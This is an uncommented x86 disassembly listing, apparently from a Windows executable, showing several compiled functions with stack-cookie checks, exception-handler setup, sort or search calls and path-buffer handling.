  4045f7:	83 7e 24 00          	cmpl   $0x0,0x24(%esi)
  4045fb:	0f 86 9c 00 00 00    	jbe    0x40469d
  404601:	8b 45 6c             	mov    0x6c(%ebp),%eax
  404604:	89 45 b8             	mov    %eax,-0x48(%ebp)
  404607:	8d 45 10             	lea    0x10(%ebp),%eax
  40460a:	c6 45 10 00          	movb   $0x0,0x10(%ebp)
  40460e:	89 45 bc             	mov    %eax,-0x44(%ebp)
  404611:	85 c9                	test   %ecx,%ecx
  404613:	74 0c                	je     0x404621
  404615:	6a 50                	push   $0x50
  404617:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40461a:	50                   	push   %eax
  40461b:	51                   	push   %ecx
  40461c:	e8 4d 3d 00 00       	call   0x40836e
  404621:	8b 45 70             	mov    0x70(%ebp),%eax
  404624:	83 e8 00             	sub    $0x0,%eax
  404627:	74 2e                	je     0x404657
  404629:	83 e8 01             	sub    $0x1,%eax
  40462c:	74 10                	je     0x40463e
  40462e:	83 e8 01             	sub    $0x1,%eax
  404631:	75 34                	jne    0x404667
  404633:	8d 45 c0             	lea    -0x40(%ebp),%eax
  404636:	50                   	push   %eax
  404637:	68 dc a6 42 00       	push   $0x42a6dc
  40463c:	eb 09                	jmp    0x404647
  40463e:	8d 45 c0             	lea    -0x40(%ebp),%eax
  404641:	50                   	push   %eax
  404642:	68 d8 a6 42 00       	push   $0x42a6d8
  404647:	8d 45 10             	lea    0x10(%ebp),%eax
  40464a:	6a 50                	push   $0x50
  40464c:	50                   	push   %eax
  40464d:	e8 ff 0c 00 00       	call   0x405351
  404652:	83 c4 10             	add    $0x10,%esp
  404655:	eb 10                	jmp    0x404667
  404657:	6a 50                	push   $0x50
  404659:	68 d4 a6 42 00       	push   $0x42a6d4
  40465e:	8d 45 10             	lea    0x10(%ebp),%eax
  404661:	50                   	push   %eax
  404662:	e8 b5 29 00 00       	call   0x40701c
  404667:	68 c0 43 40 00       	push   $0x4043c0
  40466c:	6a 04                	push   $0x4
  40466e:	ff 76 14             	push   0x14(%esi)
  404671:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  404674:	ff 76 10             	push   0x10(%esi)
  404677:	50                   	push   %eax
  404678:	e8 26 90 01 00       	call   0x41d6a3
  40467d:	83 c4 14             	add    $0x14,%esp
  404680:	85 c0                	test   %eax,%eax
  404682:	74 19                	je     0x40469d
  404684:	6b 00 0c             	imul   $0xc,(%eax),%eax
  404687:	ff 75 7c             	push   0x7c(%ebp)
  40468a:	ff b0 58 51 43 00    	push   0x435158(%eax)
  404690:	57                   	push   %edi
  404691:	e8 0a 97 01 00       	call   0x41dda0
  404696:	83 c4 0c             	add    $0xc,%esp
  404699:	b0 01                	mov    $0x1,%al
  40469b:	eb 02                	jmp    0x40469f
  40469d:	32 c0                	xor    %al,%al
  40469f:	8b 4d 60             	mov    0x60(%ebp),%ecx
  4046a2:	5f                   	pop    %edi
  4046a3:	33 cd                	xor    %ebp,%ecx
  4046a5:	5e                   	pop    %esi
  4046a6:	e8 ae 1e 01 00       	call   0x416559
  4046ab:	83 c5 64             	add    $0x64,%ebp
  4046ae:	c9                   	leave
  4046af:	c2 14 00             	ret    $0x14
  4046b2:	55                   	push   %ebp
  4046b3:	8b ec                	mov    %esp,%ebp
  4046b5:	83 ec 54             	sub    $0x54,%esp
  4046b8:	a1 5c 56 43 00       	mov    0x43565c,%eax
  4046bd:	33 c5                	xor    %ebp,%eax
  4046bf:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4046c2:	8b 45 18             	mov    0x18(%ebp),%eax
  4046c5:	56                   	push   %esi
  4046c6:	57                   	push   %edi
  4046c7:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4046ca:	8b f1                	mov    %ecx,%esi
  4046cc:	6a 50                	push   $0x50
  4046ce:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  4046d1:	51                   	push   %ecx
  4046d2:	50                   	push   %eax
  4046d3:	ff 75 14             	push   0x14(%ebp)
  4046d6:	8b ce                	mov    %esi,%ecx
  4046d8:	ff 75 08             	push   0x8(%ebp)
  4046db:	e8 f8 fe ff ff       	call   0x4045d8
  4046e0:	84 c0                	test   %al,%al
  4046e2:	74 16                	je     0x4046fa
  4046e4:	ff 75 10             	push   0x10(%ebp)
  4046e7:	8d 45 ac             	lea    -0x54(%ebp),%eax
  4046ea:	8b ce                	mov    %esi,%ecx
  4046ec:	57                   	push   %edi
  4046ed:	50                   	push   %eax
  4046ee:	e8 19 00 00 00       	call   0x40470c
  4046f3:	84 c0                	test   %al,%al
  4046f5:	0f 95 c0             	setne  %al
  4046f8:	eb 02                	jmp    0x4046fc
  4046fa:	32 c0                	xor    %al,%al
  4046fc:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4046ff:	5f                   	pop    %edi
  404700:	33 cd                	xor    %ebp,%ecx
  404702:	5e                   	pop    %esi
  404703:	e8 51 1e 01 00       	call   0x416559
  404708:	c9                   	leave
  404709:	c2 14 00             	ret    $0x14
  40470c:	55                   	push   %ebp
  40470d:	8b ec                	mov    %esp,%ebp
  40470f:	83 ec 0c             	sub    $0xc,%esp
  404712:	57                   	push   %edi
  404713:	8b f9                	mov    %ecx,%edi
  404715:	83 7f 24 00          	cmpl   $0x0,0x24(%edi)
  404719:	76 3c                	jbe    0x404757
  40471b:	68 c0 44 40 00       	push   $0x4044c0
  404720:	6a 04                	push   $0x4
  404722:	ff 77 44             	push   0x44(%edi)
  404725:	ff 77 40             	push   0x40(%edi)
  404728:	ff 75 08             	push   0x8(%ebp)
  40472b:	e8 73 8f 01 00       	call   0x41d6a3
  404730:	83 c4 14             	add    $0x14,%esp
  404733:	85 c0                	test   %eax,%eax
  404735:	74 20                	je     0x404757
  404737:	56                   	push   %esi
  404738:	6b 30 0c             	imul   $0xc,(%eax),%esi
  40473b:	ff 75 10             	push   0x10(%ebp)
  40473e:	03 77 20             	add    0x20(%edi),%esi
  404741:	8d 7d f4             	lea    -0xc(%ebp),%edi
  404744:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404745:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404746:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404747:	ff 75 fc             	push   -0x4(%ebp)
  40474a:	ff 75 0c             	push   0xc(%ebp)
  40474d:	e8 25 29 00 00       	call   0x407077
  404752:	b0 01                	mov    $0x1,%al
  404754:	5e                   	pop    %esi
  404755:	eb 02                	jmp    0x404759
  404757:	32 c0                	xor    %al,%al
  404759:	5f                   	pop    %edi
  40475a:	c9                   	leave
  40475b:	c2 0c 00             	ret    $0xc
  40475e:	56                   	push   %esi
  40475f:	ff 74 24 08          	push   0x8(%esp)
  404763:	8b f1                	mov    %ecx,%esi
  404765:	e8 19 00 00 00       	call   0x404783
  40476a:	8b ce                	mov    %esi,%ecx
  40476c:	e8 a9 08 00 00       	call   0x40501a
  404771:	80 7e 50 00          	cmpb   $0x0,0x50(%esi)
  404775:	5e                   	pop    %esi
  404776:	74 08                	je     0x404780
  404778:	6a 01                	push   $0x1
  40477a:	ff 15 20 b1 46 00    	call   *0x46b120
  404780:	c2 04 00             	ret    $0x4
  404783:	55                   	push   %ebp
  404784:	8d ac 24 e8 bd ff ff 	lea    -0x4218(%esp),%ebp
  40478b:	b8 18 42 00 00       	mov    $0x4218,%eax
  404790:	e8 6b 1e 01 00       	call   0x416600
  404795:	6a ff                	push   $0xffffffff
  404797:	68 de 9a 42 00       	push   $0x429ade
  40479c:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4047a2:	50                   	push   %eax
  4047a3:	83 ec 48             	sub    $0x48,%esp
  4047a6:	a1 5c 56 43 00       	mov    0x43565c,%eax
  4047ab:	33 c5                	xor    %ebp,%eax
  4047ad:	89 85 14 42 00 00    	mov    %eax,0x4214(%ebp)
  4047b3:	53                   	push   %ebx
  4047b4:	56                   	push   %esi
  4047b5:	57                   	push   %edi
  4047b6:	50                   	push   %eax
  4047b7:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4047ba:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4047c0:	8b f1                	mov    %ecx,%esi
  4047c2:	89 75 d0             	mov    %esi,-0x30(%ebp)
  4047c5:	8b bd 20 42 00 00    	mov    0x4220(%ebp),%edi
  4047cb:	6a 5c                	push   $0x5c
  4047cd:	58                   	pop    %eax
  4047ce:	50                   	push   %eax
  4047cf:	57                   	push   %edi
  4047d0:	89 45 ac             	mov    %eax,-0x54(%ebp)
  4047d3:	e8 c8 33 01 00       	call   0x417ba0
  4047d8:	59                   	pop    %ecx
  4047d9:	59                   	pop    %ecx
  4047da:	33 db                	xor    %ebx,%ebx
  4047dc:	85 c0                	test   %eax,%eax
  4047de:	68 00 08 00 00       	push   $0x800
  4047e3:	8d 85 50 10 00 00    	lea    0x1050(%ebp),%eax
  4047e9:	75 2d                	jne    0x404818
  4047eb:	50                   	push   %eax
  4047ec:	53                   	push   %ebx
  4047ed:	ff 15 6c a0 42 00    	call   *0x42a06c
  4047f3:	8d 85 50 10 00 00    	lea    0x1050(%ebp),%eax
  4047f9:	50                   	push   %eax
  4047fa:	e8 2a f8 ff ff       	call   0x404029
  4047ff:	33 c9                	xor    %ecx,%ecx
  404801:	68 00 08 00 00       	push   $0x800
  404806:	57                   	push   %edi
  404807:	66 89 08             	mov    %cx,(%eax)
  40480a:	8d 85 50 10 00 00    	lea    0x1050(%ebp),%eax
  404810:	50                   	push   %eax
  404811:	e8 39 28 00 00       	call   0x40704f
  404816:	eb 07                	jmp    0x40481f
  404818:	57                   	push   %edi
  404819:	50                   	push   %eax
  40481a:	e8 58 28 00 00       	call   0x407077
  40481f:	8d 4d 00             	lea    0x0(%ebp),%ecx
  404822:	e8 df d3 ff ff       	call   0x401c06
  404827:	6a 04                	push   $0x4
  404829:	8d 85 50 10 00 00    	lea    0x1050(%ebp),%eax
  40482f:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  404832:	50                   	push   %eax
  404833:	8d 4d 00             	lea    0x0(%ebp),%ecx
  404836:	e8 85 d7 ff ff       	call   0x401fc0
  40483b:	84 c0                	test   %al,%al
  40483d:	0f 84 67 07 00 00    	je     0x404faa
  404843:	8b fb                	mov    %ebx,%edi
  404845:	39 3d 00 56 43 00    	cmp    %edi,0x435600
  40484b:	76 1c                	jbe    0x404869
  40484d:	57                   	push   %edi
  40484e:	8b ce                	mov    %esi,%ecx
  404850:	e8 88 07 00 00       	call   0x404fdd
  404855:	57                   	push   %edi
  404856:	8d 4e 10             	lea    0x10(%esi),%ecx
  404859:	e8 7f 07 00 00       	call   0x404fdd
  40485e:	47                   	inc    %edi
  40485f:	3b 3d 00 56 43 00    	cmp    0x435600,%edi
  404865:	72 e6                	jb     0x40484d
  404867:	33 db                	xor    %ebx,%ebx
  404869:	68 90 43 40 00       	push   $0x404390
  40486e:	6a 04                	push   $0x4
  404870:	ff 76 04             	push   0x4(%esi)
  404873:	ff 36                	push   (%esi)
  404875:	e8 e6 8f 01 00       	call   0x41d860
  40487a:	68 e0 42 40 00       	push   $0x4042e0
  40487f:	6a 04                	push   $0x4
  404881:	ff 76 14             	push   0x14(%esi)
  404884:	ff 76 10             	push   0x10(%esi)
  404887:	e8 d4 8f 01 00       	call   0x41d860
  40488c:	83 c4 20             	add    $0x20,%esp
  40488f:	88 5d eb             	mov    %bl,-0x15(%ebp)
  404892:	83 cf ff             	or     $0xffffffff,%edi
  404895:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  404898:	83 ff ff             	cmp    $0xffffffff,%edi
  40489b:	0f 85 1a 01 00 00    	jne    0x4049bb
  4048a1:	8d 4d 00             	lea    0x0(%ebp),%ecx
  4048a4:	e8 f7 dc ff ff       	call   0x4025a0
  4048a9:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4048ac:	8d 4d 00             	lea    0x0(%ebp),%ecx
  4048af:	68 00 20 00 00       	push   $0x2000
